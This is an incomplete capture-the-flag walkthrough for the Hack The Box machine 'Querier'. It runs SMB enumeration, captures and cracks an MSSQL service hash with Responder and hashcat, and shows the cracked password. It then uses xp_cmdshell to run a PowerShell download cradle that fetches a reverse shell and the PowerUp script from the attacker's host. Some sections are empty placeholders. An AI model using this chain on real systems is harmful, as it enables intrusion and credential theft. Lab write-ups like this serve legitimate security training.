

----
Share via ## Techniques

## Tools
* nmap

## Setup

1) Add `querier.htb` to the hosts file so we can refer to the host by name
   ```bash
   $ echo "10.10.10.125 querier.htb" >> /etc/hosts
   ```

## Port Scan

1) Scan for ports and services
   ```bash
   # Use nmap to find available TCP ports quickly
   $ querier_tcp_ports=$( \
       nmap querier.htb \
            -p- \
            --min-rate=1000 \
            --max-retries=2 \
            -T4 \
            -Pn \
            -oA nmap-tcp-allports \
       | grep ^[0-9] \
       | cut -d '/' -f 1 \
       | tr '\n' ',' \
       | sed s/,$// \
     )
   
   # Scan found ports for services
   $ nmap querier.htb \
          -p ${querier_tcp_ports} \
          -sV \
          -sC \
          -T4 \
          -Pn \
          -oA nmap-tcp-foundports
   ```
   
1) Check found ports against the Vulners db/nse script
   ```bash
   $ nmap help.htb \
          -p ${querier_tcp_ports} \
          --script=vulners \
          -Pn \
          -A \
          -T4 \
          -oA nmap-tcp-foundports-vulners
   ```

### ________

1) Enumerate Web
   ```bash
   $ 
   ```
1) 

   ```bash
   $ smbclient -N -L //querier.htb/ | tee smblient-querier.htb.log

      Sharename       Type      Comment
      ---------       ----      -------
      ADMIN$          Disk      Remote Admin
      C$              Disk      Default share
      IPC$            IPC       Remote IPC
      Reports         Disk
   ```
   
   OR You can use smbmap to accomplish the same thing:
   ```bash
   $ smbmap -H 10.10.10.125 -u anonymous -d localhost | tee smbmap-querier.htb.log
   [+] Finding open SMB ports....
   [+] Guest SMB session established on 10.10.10.125...
   [+] IP: 10.10.10.125:445	Name: querier.htb                                       
      Disk                                                  	Permissions
      ----                                                  	-----------
      ADMIN$                                            	NO ACCESS
      C$                                                	NO ACCESS
      IPC$                                              	READ ONLY
      Reports                                           	READ ONLY
   ```

   ```bash
   $ smbclient -N //querier.htb/Reports
   Try "help" to get a list of possible commands.
   smb: \> ls
     .                                   D        0  Mon Jan 28 15:23:48 2019
     ..                                  D        0  Mon Jan 28 15:23:48 2019
     Currency Volume Report.xlsm         A    12229  Sun Jan 27 14:21:34 2019

         6469119 blocks of size 4096. 1595576 blocks available

   smb: \> get "Currency Volume Report.xlsm"
   getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (28.8 KiloBytes/sec) (average 28.8 KiloBytes/sec)

   smb: \> exit
   ```
   
   ```bash
   $ olevba Currency\ Volume\ Report.xlsm
   ```


   Let's try the reporting creds against the MSSQL service
   ```bash
   kali $ mssqlclient.py -windows-auth reporting@querier.htb
   
   SQL> xp_dirtree "\\10.10.14.81\FooBar\"
   ```
   
   ```bash
   kali$ responder -I tun0
   ```
   
   Copy the value of the `NTLMv2-SSP Hash` field and paste it into a new file named `hash-QUERIER_mssql-svc.ntlmv2`
   ```bash
   $ vim hash-QUERIER_mssql-svc.ntlmv2
   ```
   
   ```bash
   $ hashcat hash-QUERIER_mssql-svc.ntlmv2 \
             -m 5600 \
             --force \
             /usr/share/wordlists/rockyou.txt
   ```
   
   ```bash
   kali$ sqlite3 $( locate Responder.db )
   
   sqlite> select type,hostname,fullhash from responder;
   ```

   ```bash
   kali$ smbmap -u mssql-svc -p corporate568 -d querier -H querier.htb
   [+] Finding open SMB ports....
   [+] User SMB session establishd on querier.htb...
   [+] IP: querier.htb:445	Name: querier.htb                                       
   Disk                                                  	Permissions
   ----                                                  	-----------
   ADMIN$                                            	NO ACCESS
   C$                                                	NO ACCESS
   IPC$                                              	READ ONLY
   Reports                                           	READ ONLY

   ```


   Now try `mssqlclient.py` again with the mssql-svc accoutn credentials:
   ```bash
   $ mssqlclient.py -windows-auth mssql-svc@10.10.10.125
   ```




   ```bash
   $ locate Invoke-PowerShellTcp.ps1
   /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1

   $ cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 ./reverse.ps1
   ```

   ```bash
   # Start a local web server so we can download files from kali on the target
   kali$ python -m SimpleHTTPServer 80
   ```

   ```bash
   SQL> enable_xp_cmdshell
   SQL> xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring(\"http://10.10.14.81/reverse.ps1\")
   ```

   ```bash
   # Use readline wrap so our up key history will work
   kali$ rlwrap nc -nvlp 4444
   ```
   
   ```bash
   PS C:\Windows\system32> systeminfo
   
   PS C:\Windows\system32> whoami /priv
   ```

   ```bash
   kali$ locate PowerUp.ps1
   /root/powershell/Empire/data/module_source/privesc/PowerUp.ps1
   
   kali$ cp /root/powershell/Empire/data/module_source/privesc/PowerUp.ps1 .
   ```

   ```bash
   PS C:\Windows\systen32> IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.81/PowerUp.ps1')
   
   PS C:\Windows\system32> Invoke-AllChecks
   ```